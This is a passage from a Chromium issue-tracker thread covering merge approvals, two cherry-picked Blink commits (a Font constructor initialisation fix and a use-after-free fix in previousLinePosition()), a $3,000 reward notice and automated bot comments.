Re-ping, Before we approve merge to M52, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

Also is this change applicable to all OS or any specific OS?

### aw...@chromium.org (2016-07-15)

Looks like 401231 was in 53.0.2785.8 which released 7/7 so it's had a good amount of bake time. My assumption is that it's on all OSs.

### go...@chromium.org (2016-07-15)

Thank you awhalley@. Approving merges to M52 branch 2743 & M53 branch 2785. Please merge ASAP.

### bu...@chromium.org (2016-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c1b06954220f96a85ce764396cf5cc5e24a9fba4

commit c1b06954220f96a85ce764396cf5cc5e24a9fba4
Author: Yoshifumi Inoue <yosin@chromium.org>
Date: Fri Jul 15 01:20:32 2016

Make default constructor of Font class to initialize all member variables

This patch makes default constructor of |Font| class to initialize
|m_canShapeWordByWord| and |m_shapeWordByWordComputed| member variables to
make MSAN happy.

This patch is a preparation of re-landing http://crrev.com/2082893005, which
is revered by uninitialized member variables of |Font|.

BUG=618237, 622566
TEST=n/a; MSAN will check this

Review-Url: https://codereview.chromium.org/2091633002
Cr-Commit-Position: refs/heads/master@{#401567}
(cherry picked from commit 2217e8c563575ead5c9450408529340ec93ccef7)

Review URL: https://codereview.chromium.org/2151143002 .

Cr-Commit-Position: refs/branch-heads/2743@{#640}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/c1b06954220f96a85ce764396cf5cc5e24a9fba4/third_party/WebKit/Source/platform/fonts/Font.cpp


### yo...@chromium.org (2016-07-15)

Branch M53 has already had this fixes, no need to merge.

### yo...@chromium.org (2016-07-15)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/16d4aaf9a5794ff0e10c57bf7b7bbfadee3ba26a

commit 16d4aaf9a5794ff0e10c57bf7b7bbfadee3ba26a
Author: Yoshifumi Inoue <yosin@chromium.org>
Date: Fri Jul 15 01:31:25 2016

Make previousLinePosition() not to use dangling RootInlineBox

This patch makes |previousLinePosition()| not to use dangling |RootInlineBox|
pointer to avoid use-after-free.

Before this patch, |isEditablePosition()| is called with |DoUpdateStyle|
parameter to update layout tree if needed. Usually, layout tree isn't updated
by this |isEditablePosition()| call since |previousLinePosition()| updates
layout tree at entry. However, if there are pending style sheet, e.g. @import
directive, and HTML import, e.g link rel=import, layout tree is updated since
document isn't rendering ready, |haveImportLoaded()| &&
|haveRenderBlockingStyleSheetsLoaded()|.

BUG=618237
TEST=LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html

Committed: https://crrev.com/fb81c66590538c2487a34b8623066a22d0b27dff
Review-Url: https://codereview.chromium.org/2082893005
Cr-Original-Commit-Position: refs/heads/master@{#401231}
Cr-Commit-Position: refs/heads/master@{#401581}
(cherry picked from commit e9c943f368d15bbfe414aedf5e001792257f3eeb)

Review URL: https://codereview.chromium.org/2149913003 .

Cr-Commit-Position: refs/branch-heads/2743@{#642}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[add] https://crrev.com/16d4aaf9a5794ff0e10c57bf7b7bbfadee3ba26a/third_party/WebKit/LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html
[modify] https://crrev.com/16d4aaf9a5794ff0e10c57bf7b7bbfadee3ba26a/third_party/WebKit/Source/core/editing/VisibleUnits.cpp


### aw...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

Hello! $3,000 for this one.

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### tk...@chromium.org (2016-10-12)

[Empty comment from Monorail migration]

[Monorail components: -Blink>TextSelection Blink>Editing>Selection]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/618237?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/chromium/622566]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084500)*
